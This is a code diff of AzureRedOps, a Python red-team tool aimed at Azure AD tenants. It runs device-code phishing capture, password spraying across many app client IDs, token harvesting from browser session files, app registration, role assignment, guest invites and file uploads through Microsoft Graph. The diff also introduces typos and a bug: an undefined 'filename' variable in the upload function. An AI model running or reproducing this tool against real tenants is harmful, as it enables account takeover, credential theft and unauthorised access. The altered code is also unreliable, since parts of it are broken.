@@ -25,7 +25,6 @@ from playwright.sync_api import sync_playwright
 
 VERSION = "0.1"
 
-
 class AzureRedOps:
     VERSION = VERSION
     WHITESPACE_LENGTH = 16
@@ -54,11 +53,61 @@ class AzureRedOps:
         self.additional_headers = {}
         self.microsoft_endpoint = self.DEFAULT_ENDPOINT
 
+    def redirect_to_file(self):
+        if self.builtin_print is None:
+            self.builtin_print = builtins.print
+
+        builtins.print = self.redirect_print
+
+    def redirect_print(self, *args, **kwargs):
+        output = args[0]
+        timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
+
+        self.builtin_print(output)
+        with open("output.txt", "a+") as f:
+            f.write(f"[{timestamp}] {output}")
+
     @staticmethod
     def extract_guid(data):
         guid_pattern = r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
         result = re.findall(guid_pattern, data)
         return result[0] if result else ""
+
+    def w(self, data, length=None, delimeter=":"):
+        if length is None:
+            length = self.WHITESPACE_LENGTH
+        return f"{data}{' ' * (length - len(data))}{delimeter} "
+
+    def print_hint(self, data):
+        for line in data:
+            print(f"{self.w("Hint")}{line}")
+
+    def is_debug(self, verbose = False):
+        if verbose:
+            if self.verbose_debug_mode:
+                return True
+            else:
+                return False
+        if self.verbose_debug_mode or self.debug_mode:
+            return True
+        return False
+
+    def debug(self, data):
+        if self.is_debug():
+            print(f"{self.w("Debug")}{data}")
+
+    def debug_print_http(self, http):
+        print(f"{self.w("Debug")}Request: {http.request.url}")
+        for header in http.request.headers:
+            print(f"{self.w("Header")}{header}: {http.request.headers.get(header)}")
+
+        print(f"{self.w("Body")}{http.request.body}")
+
+        print(f"{self.w("Debug")}Response:")
+        for header in http.headers:
+            print(f"{self.w("Header")}{header}: {http.headers.get(header)}")
+
+        print(f"{self.w("Body")}{http.text}")
 
     @staticmethod
     def is_args_set(args, arg, die=True):
@@ -93,72 +142,22 @@ class AzureRedOps:
     def now():
         return time.time()
 
-    @staticmethod
-    def set_authorization_header(headers, token):
-        headers["Authorization"] = f"Bearer {token}"
-        headers["Content-Type"] = "application/json"
-        return headers
-
-    def redirect_to_file(self):
-        if self.builtin_print is None:
-            self.builtin_print = builtins.print
-
-        builtins.print = self.redirect_print
-
-    def redirect_print(self, *args, **kwargs):
-        output = args[0]
-        timestamp = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
-
-        self.builtin_print(output)
-        with open("output.txt", "a+") as f:
-            f.write(f"[{timestamp}] {output}")
-
-    def w(self, data, length=None, delimiter=":"):
-        if length is None:
-            length = self.WHITESPACE_LENGTH
-        return f"{data}{' ' * (length - len(data))}{delimiter} "
-
-    def print_hint(self, data):
-        for line in data:
-            print(f"{self.w('Hint')}{line}")
-
-    def is_debug(self, verbose = False):
-        if verbose:
-            if self.verbose_debug_mode:
-                return True
-            else:
-                return False
-        if self.verbose_debug_mode or self.debug_mode:
-            return True
-        return False
-
-    def debug(self, data):
-        if self.is_debug():
-            print(f"{self.w('Debug')}{data}")
-
-    def debug_print_http(self, http):
-        print(f"{self.w('Debug')}Request: {http.request.url}")
-        for header in http.request.headers:
-            print(f"{self.w('Header')}{header}: {http.request.headers.get(header)}")
-
-        print(f"{self.w('Body')}{http.request.body}")
-
-        print(f"{self.w('Debug')}Response:")
-        for header in http.headers:
-            print(f"{self.w('Header')}{header}: {http.headers.get(header)}")
-
-        print(f"{self.w('Body')}{http.text}")
-
     def format_date(self, timestamp, format=None):
         if format is None:
             format = self.DATE_STANDARD
         date = datetime.datetime.fromtimestamp(timestamp)
         return date.strftime(format)
 
+    @staticmethod
+    def set_authorization_header(headers, token):
+        headers["Authorization"] = f"Bearer {token}"
+        headers["Content-Type"] = "application/json"
+        return headers
+
     def save_to_file(self, filename, data):
         with open(filename, "a+") as f:
             json.dump(data, f, indent=4)
-        print(f"{self.w('Action')}Data saved to '{filename}'")
+        print(f"{self.w("Action")}Data saved to '{filename}'")
 
     def print_data(self, data, length=None):
         if length is None:
@@ -170,11 +169,11 @@ class AzureRedOps:
                     if isinstance(value, list):
                         print(f"{self.w(item, length)}")
                         for v in value:
-                            print(f"{self.w('', 8, '-')}{v}")
+                            print(f"{self.w("", 8, "-")}{v}")
                     elif isinstance(value, dict):
                         print(f"{self.w(item, length)}")
                         for v in value:
-                            print(f"{self.w('', 8, '-')}{v}: {value.get(v)}")
+                            print(f"{self.w("", 8, "-")}{v}: {value.get(v)}")
                     else:
                         print(f"{self.w(item, length)}{data.get(item)}")
                 else:
@@ -184,13 +183,13 @@ class AzureRedOps:
         if self.autosave:
             token_data = self.decode_jwt(access_token)
             self.save_azure_token_to_file(access_token, refresh_token, token_data.get("tid"), self.autosave_username)
-            print(f"{self.w('Action')}Access token saved for '{self.autosave_username}'.")
+            print(f"{self.w("Action")}Access token saved for '{self.autosave_username}'.")
 
     def parse_headers(self, headers):
         try:
             headers = json.loads(headers)
         except:
-            print(f"{self.w('Error')}Custom headers are not in a valid JSON format.")
+            print(f"{self.w("Error")}Custom headers is not a valid JSON format.", True)
         self.additional_headers = headers
 
     def http_request(self, url, headers=None, send_json=True, expect_json=True, verb="POST", data=None):
@@ -229,8 +228,10 @@ class AzureRedOps:
                 return response.json()
             return response.text
         except Exception as e:
-            print(f"{self.w('Error')}{str(e)}")
+            print(f"{self.w("Error")}{str(e)}")
             exit()
+
+    ### Activities
 
     def save_azure_token_to_file(self, token, refresh_token, tenant, name):
         data = {}
@@ -239,8 +240,8 @@ class AzureRedOps:
                 with open(self.CREDS_FILE_PATH, "r") as f:
                     data = json.load(f)
         except:
-            print(f"{self.w('Error')}Credentials file appears to be corrupted.")
-            answer = input(f"{self.w('Action')}Do you want to restore the file? (yes/no): ")
+            print(f"{self.w("Error")}Credentials file appear to be corrupted.")
+            answer = input(f"{self.w("Action")}Do you want to restore the file. (yes/no): ")
             if not answer[:1] == "y":
                 exit()
 
@@ -250,7 +251,7 @@ class AzureRedOps:
             json.dump(data, f, indent=4)
 
     def get_azure_token_from_file(self, name, key):
-        print(f"{self.w('Action')}Loading access token '{name}'.")
+        print(f"{self.w("Action")}Loading access token '{name}'.")
         data = {}
         if os.path.exists(self.CREDS_FILE_PATH):
             with open(self.CREDS_FILE_PATH, "r") as f:
@@ -258,11 +259,11 @@ class AzureRedOps:
 
         token = data.get(name)
         if token == None:
-            print(f"{self.w('Error')}Access token not found for '{name}'.")
+            print(f"{self.w("Error")}Access token not found for '{name}'.")
             exit()
         data = token.get(key)
         if not data:
-            print(f"{self.w('Error')}'{key}' not set for '{name}'.")
+            print(f"{self.w("Error")}'{key}' not set for '{name}'.")
             exit()
         return data
 
@@ -273,10 +274,10 @@ class AzureRedOps:
                 data = json.load(f)
 
         for item in data:
-            print(f"{self.w('Access token name')}{item}")
+            print(f"{self.w("Access token name")}{item}")
 
     def view_saved_token(self, name):
-        print(f"{self.w('Action')}Loading access token '{name}'.")
+        print(f"{self.w("Action")}Loading access token '{name}'.")
         data = {}
         if os.path.exists(self.CREDS_FILE_PATH):
             with open(self.CREDS_FILE_PATH, "r") as f:
@@ -284,7 +285,7 @@ class AzureRedOps:
 
         token = data.get(name)
         if token == None:
-            print(f"{self.w('Error')}Access token not found for '{name}'.")
+            print(f"{self.w("Error")}Access token not found for '{name}'.")
             exit()
 
         try:
@@ -293,11 +294,11 @@ class AzureRedOps:
                 date = f" ({self.format_date(data.get(item))})" if item == "exp" else ""
                 print(f"{self.w(item)}{data.get(item)}{date}")
         except Exception as e:
-            print(f"{self.w('Error')}Access token is not a valid JWT for '{name}'.")
+            print(f"{self.w("Error")}Access token is not a valid JWT for '{name}'.")
             exit()
 
     def delete_saved_token(self, name):
-        print(f"{self.w('Action')}Deleting access token '{name}'.")
+        print(f"{self.w("Action")}Deleting access token '{name}'.")
         if os.path.exists(self.CREDS_FILE_PATH):
             with open(self.CREDS_FILE_PATH, "r") as f:
                 data = json.load(f)
@@ -310,28 +311,28 @@ class AzureRedOps:
     def get_azure_tenant_id(self, tenant):
         response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/v2.0/.well-known/openid-configuration", verb="GET")
         if "token_endpoint" in response:
-            print(f"{self.w('Url')}{response['token_endpoint']}")
-            print(f"{self.w('Tenant ID')}{self.extract_guid(response['token_endpoint'])}")
+            print(f"{self.w("Url")}{response["token_endpoint"]}")
+            print(f"{self.w("Tenant ID")}{self.extract_guid(response["token_endpoint"])}")
         else:
-            print(f"{self.w('Error')}No Azure tenant for the '{tenant}' domain")
+            print(f"{self.w("Error")}No Azure tenant for the '{tenant}' domain")
 
     def device_code_start(self, autostart, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common"):
         if tenant == None:
             tenant = "common"
-        print(f"{self.w('Success')}AppId is set to {appId}.")
-        print(f"{self.w('Success')}Tenant is set to {tenant}.")
+        print(f"{self.w("Success")}AppId is set to {appId}.")
+        print(f"{self.w("Success")}Tenant is set to {tenant}.")
         data = { "client_id": appId, "resource": self.default_audience }
         response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/devicecode", data=data, send_json=False)
 
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
-            print(f"{self.w('Description')}{response['error_description']}")
+            print(f"{self.w("Error")}{response["error"]}")
+            print(f"{self.w("Description")}{response["error_description"]}")
         else:
-            print(f"{self.w('Url')}https://microsoft.com/devicelogin")
-            print(f"{self.w('User Code')}{response['user_code']}")
-            print(f"{self.w('Device Code')}{response['device_code']}")
+            print(f"{self.w("Url")}https://microsoft.com/devicelogin")
+            print(f"{self.w("User Code")}{response["user_code"]}")
+            print(f"{self.w("Device Code")}{response["device_code"]}")
             if autostart:
-                print(f"{self.w('Action')}Autostarting authentication capture.")
+                print(f"{self.w("Action")}Autostarting capturing authentication.")
                 self.device_code_capture(response["device_code"], appId, tenant)
 
     def device_code_capture(self, code, appId = "d3590ed6-52b3-4102-aeff-aad2292ab01c", tenant = "common"):
@@ -341,21 +342,21 @@ class AzureRedOps:
         token_received = False
         data = { "client_id": appId, "resource": self.default_audience, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "code": code }
         while not token_received:
-            print(f"{self.w('Action')}Fetching authentication token.")
+            print(f"{self.w("Action")}Fetching authentication token.")
             time.sleep(self.DELAY_REQUEST)
             response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)
 
             if "error" in response:
                 if not "Authorization is pending" in response["error_description"]:
-                    print(f"{self.w('Error')}{response['error']}")
-                    print(f"{self.w('Description')}{response['error_description']}")
+                    print(f"{self.w("Error")}{response["error"]}")
+                    print(f"{self.w("Description")}{response["error_description"]}")
             else:
                 token_received = True
                 token = self.decode_jwt(response["access_token"])
-                print(f"{self.w('Username')}{token.get('upn')}")
-                print(f"{self.w('Tenant ID')}{token.get('tid')}")
-                print(f"{self.w('Access Token')}{response['access_token']}")
-                print(f"{self.w('Refresh Token')}{response['refresh_token']}")
+                print(f"{self.w("Username")}{token.get("upn")}")
+                print(f"{self.w("Tenant ID")}{token.get("tid")}")
+                print(f"{self.w("Access Token")}{response["access_token"]}")
+                print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
                 self.save_credentials(response["access_token"], response["refresh_token"])
 
     def auth(self, username, password, tenant, appid, version):
@@ -368,36 +369,36 @@ class AzureRedOps:
             response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)
 
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
-            print(f"{self.w('Description')}{response['error_description']}")
+            print(f"{self.w("Error")}{response["error"]}")
+            print(f"{self.w("Description")}{response["error_description"]}")
         else:
-            print(f"{self.w('Access Token')}{response['access_token']}")
-            print(f"{self.w('Refresh Token')}{response['refresh_token']}")
+            print(f"{self.w("Access Token")}{response["access_token"]}")
+            print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
             self.save_credentials(response["access_token"], response["refresh_token"])
 
     def auth_app(self, tenant, appid="8545b2fc-a69c-4851-9206-0f74a519fe5f"):
         server = WebServer(tenant, appid, "localhost", 2342)
         url = server.generate_url()
-        print(f"{self.w('Success')}Copy the following URL in your browser: {url}")
+        print(f"{self.w("Success")}Copy the following URL in your browser: {url}")
         code, verifier, redirect_url = server.server()
-        print(f"{self.w('Success')}Got the authentication code: {code}")
+        print(f"{self.w("Success")}Got the authentication code: {code}")
         data = { "client_id": appid, "grant_type": "authorization_code", "code": code, "redirect_uri": redirect_url, "code_verifier": verifier, "scope": self.default_scope }
 
         response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/v2.0/token", data=data, send_json=False)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
-            print(f"{self.w('Description')}{response['error_description']}")
+            print(f"{self.w("Error")}{response["error"]}")
+            print(f"{self.w("Description")}{response["error_description"]}")
         else:
-            print(f"{self.w('Access Token')}{response['access_token']}")
-            print(f"{self.w('Refresh Token')}{response['refresh_token']}")
+            print(f"{self.w("Access Token")}{response["access_token"]}")
+            print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
             self.save_credentials(response["access_token"], response["refresh_token"])
 
     def auth_interactive(self, url, keep = False):
         delay = 75
         session_file_path = "session.har"
 
-        print(f"{self.w('Action')}Spawning a browser to authenticate. The redirection will be sent to {url}.")
-        print(f"{self.w('Action')}You have {delay} seconds to complete the authentication.")
+        print(f"{self.w("Action")}Spawning a browser to authenticate. The redirection will be send to {url}.")
+        print(f"{self.w("Action")}You have {delay} seconds to complete the authentication.")
 
         try:
             with sync_playwright() as p:
@@ -409,16 +410,16 @@ class AzureRedOps:
                 time.sleep(delay)
 
                 for u in url.split(","):
-                    print(f"{self.w('Action')}Waited for {delay} seconds. Redirecting to {u}.")
+                    print(f"{self.w("Action")}Waited for {delay} seconds. Redirecting to {u}.")
                     page.goto(u, wait_until="networkidle")
                     time.sleep(10)
 
                 context.close()
                 browser.close()
         except Exception as e:
-            print(f"{self.w('Error')}{str(e)}")
+            print(f"{self.w("Error")}{str(e)}")
 
-        print(f"{self.w('Action')}Parsing the session.har file and gathering all access token.")
+        print(f"{self.w("Action")}Parsing the session.har file and gathering all access token.")
 
         access_tokens = []
         i = 0
@@ -440,23 +441,23 @@ class AzureRedOps:
             if not keep:
                 os.unlink(session_file_path)
             else:
-                print(f"{self.w('Action')}{session_file_path} file was preserved.")
+                print(f"{self.w("Action")}{session_file_path} file was preserved.")
         except:
             pass
 
-        print(f"{self.w('Action')}A total of {len(access_tokens)} access tokens were found.")
+        print(f"{self.w("Action")}A total of {len(access_tokens)} access token were found.")
         i = 0
         for token in access_tokens:
-            print(f"{self.w(f'Token {i}')}Information")
+            print(f"{self.w(f"Token {i}")}Information")
             data = self.decode_jwt(token.get("access_token"))
 
             for item in data:
                 date = f" ({self.format_date(data.get(item))})" if item == "exp" else ""
-                print(f"{self.w(f'Token {i} - {item}')}{data.get(item)}{date}")
+                print(f"{self.w(f"Token {i} - {item}")}{data.get(item)}{date}")
             i += 1
 
-        options = input(f"{self.w('Action')}Select the access token you want to save (0 or 0,1,2): ")
-        name = input(f"{self.w('Action')}Please specify a name for the saved credentials: ")
+        options = input(f"{self.w("Action")}Select the access token you want to save (0 or 0,1,2): ")
+        name = input(f"{self.w("Action")}Please specify a name for the saved credentials: ")
         options = options.split(",")
 
         for option in options:
@@ -464,7 +465,7 @@ class AzureRedOps:
                 self.autosave_username = f"{name}-{option}"
                 self.save_credentials(access_tokens[int(option)].get("access_token"), access_tokens[int(option)].get("refresh_token"))
             except:
-                print(f"{self.w('Error')}Could not save {self.autosave_username}. Token ID invalid?")
+                print(f"{self.w("Error")}Could not save {self.autosave_username}. Token ID invalid?")
 
     def refresh(self, refresh_token, tenant, appid, return_token = False, version = "v2.0"):
         if version == "v2.0":
@@ -476,26 +477,25 @@ class AzureRedOps:
             response = self.http_request(f"https://login.{self.microsoft_endpoint}/{tenant}/oauth2/token", data=data, send_json=False)
 
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
-            print(f"{self.w('Description')}{response['error_description']}")
+            print(f"{self.w("Error")}{response["error"]}")
+            print(f"{self.w("Description")}{response["error_description"]}")
         else:
             if not return_token:
-                print(f"{self.w('Access Token')}{response['access_token']}")
-                print(f"{self.w('Refresh Token')}{response['refresh_token']}")
+                print(f"{self.w("Access Token")}{response["access_token"]}")
+                print(f"{self.w("Refresh Token")}{response["refresh_token"]}")
                 self.save_credentials(response["access_token"], response["refresh_token"])
             else:
                 return response
-
 
     def graph_spray(self, username, password, tenant, filepath = "includes/auth_apps.json"):
         apps = None
         if filepath == None:
             filepath = "includes/auth_apps.json"
-        print(f"{self.w('Action')}Spraying using {filepath} as the source.")
+        print(f"{self.w("Action")}Spraying using {filepath} as the source.")
         with open(filepath) as f:
             apps = json.load(f)
 
-        print(f"{self.w('Action')}Spraying v0 API.")
+        print(f"{self.w("Action")}Spraying v0 API.")
         for app in apps.get("v0"):
             appname = list(app.keys())[0]
             data = { "client_id": app.get(appname), "scope": self.default_scope, "username": username, "password": password, "grant_type": "password", "resource": self.default_audience }
@@ -506,7 +506,7 @@ class AzureRedOps:
 
             time.sleep(1)
 
-        print(f"{self.w('Action')}Spraying v2.0 API.")
+        print(f"{self.w("Action")}Spraying v2.0 API.")
         for app in apps.get("v2.0"):
             appname = list(app.keys())[0]
             data = { "client_id": app.get(appname), "scope": self.default_scope, "username": username, "password": password, "grant_type": "password" }
@@ -520,11 +520,11 @@ class AzureRedOps:
         data = None
         if filepath == None:
             filepath = "includes/auth_apps.json"
-        print(f"{self.w('Action')}Spraying using {filepath} as the source.")
+        print(f"{self.w("Action")}Spraying using {filepath} as the source.")
         with open(filepath, "r") as f:
             data = json.load(f)
 
-        print(f"{self.w('Action')}Spraying v0 API.")
+        print(f"{self.w("Action")}Spraying v0 API.")
         for app in data.get("v0"):
             appname = list(app)[0]
             appid = list(app.values())[0]
@@ -534,7 +534,7 @@ class AzureRedOps:
 
             time.sleep(1)
 
-        print(f"{self.w('Action')}Spraying v2.0 API.")
+        print(f"{self.w("Action")}Spraying v2.0 API.")
         for app in data.get("v2.0"):
             appname = list(app)[0]
             appid = list(app.values())[0]
@@ -545,24 +545,25 @@ class AzureRedOps:
             time.sleep(1)
 
     def spray_print(self, response, appname, guid):
-        if not "error" in response:
-            print(f"{self.w('Success')}{appname} ({guid}) login successful.")
-            if self.check_privileges:
-                print(f"{self.w('Action')}Checking permissions.")
-                token = self.decode_jwt(response["access_token"])
-                print(f"{self.w('Token scope')}{token.get('scp')}")
 
-                output = self.graph_list_all_users(response["access_token"], None, "?$top=1", False)
-                if not "error" in output:
-                    print(f"{self.w('Success')}All users can be enumerated.")
+                if not "error" in response:
+                    print(f"{self.w("Success")}{appname} ({guid}) login successful.")
+                    if self.check_privileges:
+                        print(f"{self.w("Action")}Checking permissions.")
+                        token = self.decode_jwt(response["access_token"])
+                        print(f"{self.w("Token scope")}{token.get("scp")}")
 
-                output = self.graph_list_applications(response["access_token"], None, "?$top=1", False)
-                if not "error" in output:
-                    print(f"{self.w('Success')}All applications can be viewed.")
+                        output = self.graph_list_all_users(response["access_token"], None, "?$top=1", False)
+                        if not "error" in output:
+                           print(f"{self.w("Success")}All users can be enumerated.")
 
-        else:
-            print(f"{self.w('Failed')}{appname} ({guid}) failed.")
-            print(f"{self.w('Failed')}{response['error']}")
+                        output = self.graph_list_applications(response["access_token"], None, "?$top=1", False)
+                        if not "error" in output:
+                           print(f"{self.w("Success")}All applications can be viewed.")
+
+                else:
+                    print(f"{self.w("Failed")}{appname} ({guid}) failed.")
+                    print(f"{self.w("Failed")}{response["error"]}")
 
     def get_known_ids(self):
         data = None
@@ -578,7 +579,7 @@ class AzureRedOps:
             data = json.load(f)
 
         for item in data:
-            print(f"{self.w('Category')}{item}")
+            print(f"{self.w("Category")}{item}")
 
     def get_ids_of_interest(self, id_only, type):
         data = None
@@ -588,7 +589,7 @@ class AzureRedOps:
         for item in data:
             if type == None or item in type:
                 if not id_only:
-                    print(f"{self.w('Category', 48)}{item}")
+                    print(f"{self.w("Category", 48)}{item}")
                 for app in data.get(item):
                     if id_only:
                         for item in app:
@@ -596,12 +597,14 @@ class AzureRedOps:
                     else:
                         self.print_data(app, 48)
 
+    # Graph
+
     def graph_self(self, token):
         headers = {}
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/v1.0/me", verb="GET", headers=headers)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             self.print_data(response)
 
@@ -610,7 +613,7 @@ class AzureRedOps:
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/beta/policies/authorizationPolicy/authorizationPolicy", verb="GET", headers=headers)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             self.print_data(response)
 
@@ -619,7 +622,7 @@ class AzureRedOps:
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/v1.0/me/messages?$search=\"{filter}\"", verb="GET", headers=headers)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             self.print_data(response)
 
@@ -651,14 +654,14 @@ class AzureRedOps:
     def graph_list_principals(self, token, filename):
         self.graph_raw_url(token, "https://graph.microsoft.com/v1.0/servicePrincipals", filename)
 
-    def graph_register_app(self, token, name):
-        data = { "displayName": name, "signInAudience": "AzureADMyOrg", "passwordCredentials": [ { "displayName": f"{name}Secret", "startDateTime": f"{self.format_date(self.now(), self.DATE_ZULU)}", "endDateTime": f"{self.format_date(self.now() + 31536000, self.DATE_ZULU)}" } ] }
+    def graph_register_app(self, token, name, url):
+        data = {"displayName": name, "signInAudience": "AzureADMyOrg", "publicClient": {"redirectUris": [url]}, "requiredResourceAccess": [{"resourceAppId": "00000003-0000-0000-c000-000000000000", "resourceAccess": [{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}]}], "isFallbackPublicClient": True}
         headers = {}
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/v1.0/applications", verb="POST", headers=headers, data=data, send_json=True)
 
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             self.print_data(response)
 
@@ -668,7 +671,7 @@ class AzureRedOps:
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments", verb="POST", headers=headers, data=data, send_json=True)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             for item in response:
                 self.print_data(item)
@@ -679,14 +682,14 @@ class AzureRedOps:
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/v1.0/groups", verb="POST", headers=headers, data=data, send_json=True)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             for item in response:
                 self.print_data(item)
 
     def graph_push_file(self, token, filepath, name):
         if not os.path.exists(filepath):
-            print(f"{self.w('Error')}{filepath} not found.")
+            print(f"{self.w("Error")}{filename} not found.")
             exit()
 
         data = open(filepath, "r").read()
@@ -694,7 +697,7 @@ class AzureRedOps:
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/v1.0/me/drive/root:/{name}:/content", verb="PUT", headers=headers, data=data)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             for item in response:
                 self.print_data(item)
@@ -720,7 +723,7 @@ class AzureRedOps:
         response = self.http_request(url, verb="GET", headers=headers)
 
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             next = None
             try:
@@ -750,7 +753,7 @@ class AzureRedOps:
         self.set_authorization_header(headers, token)
         response = self.http_request(f"https://graph.microsoft.com/beta/invitations", verb="POST", headers=headers, data=data, send_json=True)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             for item in response:
                 self.print_data(item)
@@ -764,7 +767,7 @@ class AzureRedOps:
         url = "https://graph.microsoft.com/v1.0/oauth2PermissionGrants"
         response = self.http_request(url, verb="GET", headers=headers)
         if "error" in response:
-            print(f"{self.w('Error')}{response['error']}")
+            print(f"{self.w("Error")}{response["error"]}")
         else:
             for item in response["value"]:
                 grants.append(item)
@@ -774,7 +777,7 @@ class AzureRedOps:
                 for item in response["value"]:
                     grants.append(item)
 
-            print(f"{self.w('Action')}Got {len(grants)} grants.")
+            print(f"{self.w("Action")}Got {len(grants)} grants.")
 
             for grant in grants:
                 if grant.get("consentType") == "AllPrincipals":
@@ -782,9 +785,9 @@ class AzureRedOps:
 
             allprincipals = list(dict.fromkeys(allprincipals))
 
-            print(f"{self.w('Action')}Got {len(allprincipals)} with consentType set to AllPrincipals.")
+            print(f"{self.w("Action")}Got {len(allprincipals)} with consentType set to AllPrincipals.")
 
-            print(f"{self.w('Action')}Searching for application with appRoleAssignmentRequired set to False and type set to User.")
+            print(f"{self.w("Action")}Searching for application with appRoleAssignmentRequired set to False and type set to User.")
             for all in allprincipals:
                 time.sleep(0.2)
                 response = self.http_request(f"https://graph.microsoft.com/v1.0/servicePrincipals/{all}", verb="GET", headers=headers)
@@ -798,9 +801,9 @@ class AzureRedOps:
                             if scope[0].get("type") == "User":
                                 client_url = response.get("publicClient")
                                 if client_url:
-                                    print(f"{self.w('Success')}{response.get('displayName')} ({response.get('appId')}).")
+                                    print(f"{self.w("Success")}{response.get("displayName")} ({response.get("appId")}).")
                                     for client in client_url.get("redirectUris"):
-                                        print(f"{self.w('Success')}Url Redirection set to {client}.")
+                                        print(f"{self.w("Success")}Url Redirection set to {client}.")
 
 
 def main():
@@ -812,59 +815,61 @@ def main():
     parser.add_argument("-c", "--devicecode", required=False, help="Device code")
     parser.add_argument("-tid", "--tenant-id", required=False, help="Azure tenant ID")
     parser.add_argument("-app", "--appid", required=False, default="d3590ed6-52b3-4102-aeff-aad2292ab01c", help="Application client ID")
-    parser.add_argument("-e", "--endpoint", required=False, default="microsoftonline.com", help="Login endpoint to use (default: microsoftonline.com)")
+    parser.add_argument("-e", "--endpoint", required=False, default="microsoftonline.com", help="Endpoint to us microsoft.com by default")
     parser.add_argument("-r", "--refresh-token", required=False, help="Authentication refresh token")
     parser.add_argument("-as", "--auto-start", required=False, action="store_true", default=True, help="Autostart phishing capture")
     parser.add_argument("-l", "--load-access-token", required=False, help="Load Azure access token from cache")
-    parser.add_argument("-j", "--json", required=False, help="Save output to a json file")
+    parser.add_argument("-j", "--json", required=False, help="Save output to json a json file")
     parser.add_argument("-fl", "--filter", required=False, help="Filter only certain attributes, comma-separated (e.g., AppID, GivenName)")
     parser.add_argument("-u", "--username", required=False, help="User principal name (email)")
     parser.add_argument("-p", "--password", required=False, help="User password")
     parser.add_argument("-s", "--save", required=False, action="store_true", default=False, help="Save to the credentials file")
-    parser.add_argument("-cp", "--check-privileges", required=False, action="store_true", default=False, help="Check if the user has privileges upon successful login")
+    parser.add_argument("-cp", "--check-privileges", required=False, action="store_true", default=False,
+    help="Check if the user have privileges upon successful login")
     parser.add_argument("-uid", "--uid", required=False, help="Azure user ID")
     parser.add_argument("-headers", "--headers", required=False, help="Add headers json formatted {'key': 'value', 'key': 'value'}")
     parser.add_argument("-gid", "--gid", required=False, default="62e90394-69f5-4237-91f9-056ad24d70a7", help="Azure group ID")
-    parser.add_argument("-i", "--id", required=False, action="store_true", default=False, help="Only return application ID")
+    parser.add_argument("-i", "--id", required=False, action="store_true", default=False,
+    help="Only return application ID")
     parser.add_argument("-ty", "--type", required=False, help="Type of application ID to return")
     parser.add_argument("-fp", "--filepath", required=False, help="Filepath to the file to upload")
     parser.add_argument("-v", "--version", required=False, default="v2.0", help="Authentication version (v0, v2.0)")
     parser.add_argument("-ua", "--user-agent", required=False, help="Set user agent")
     parser.add_argument("-au", "--audience", required=False, help="Set audience (default to https://graph.microsoft.com)")
     parser.add_argument("-sc", "--scope", required=False, help="Set scope (default to: openid offline_access). You may want to use openid only for spraying and https://graph.microsoft.com/.default for Graph")
-    parser.add_argument("-url", "--url", required=False, help="Send request to a user specified URL. For interactive login it supports multiple URLs in a comma-separated list: https://url.com,https://url2.com")
+    parser.add_argument("-url", "--url", required=False, help="Send request to a user specified URL. For interactive login it support multiple URL in a comma separated list: https://url.com,https://url2.com")
     parser.add_argument("-beta", "--beta", required=False, action="store_true", default=False, help="Use the beta API")
     parser.add_argument("-exp", "--expand", required=False, action="store_true", default=False, help="Format output list and dict by expanding them to human readable format")
     parser.add_argument("-k", "--keep", required=False, action="store_true", default=False, help="Keep session.har file")
     parser.add_argument("-d", "--debug", required=False, action="store_true", default=False, help="Show debugging information")
-    parser.add_argument("-dd", "--verbose-debug", required=False, action="store_true", default=False, help="Show http request debugging information")
+    parser.add_argument("-dd", "--verbose-debug", required=False, action="store_true", default=False, help="Show http request debugging  information")
     parser.add_argument("-re", "--redirect-to-file", required=False, action="store_true", default=False, help="Redirect all prints to file")
     args = parser.parse_args()
 
     app = AzureRedOps()
 
     app.microsoft_endpoint = args.endpoint
-    print(f"{app.w('Action')}Microsoft domain set to '{app.microsoft_endpoint}'.")
+    print(f"{app.w("Action")}Microsoft domain set to '{app.microsoft_endpoint}'.")
 
     if args.redirect_to_file:
-        print(f"{app.w('Action')}Output will be redirected to output.txt.")
+        print(f"{app.w("Action")}Output will be redirected to a output.txt.")
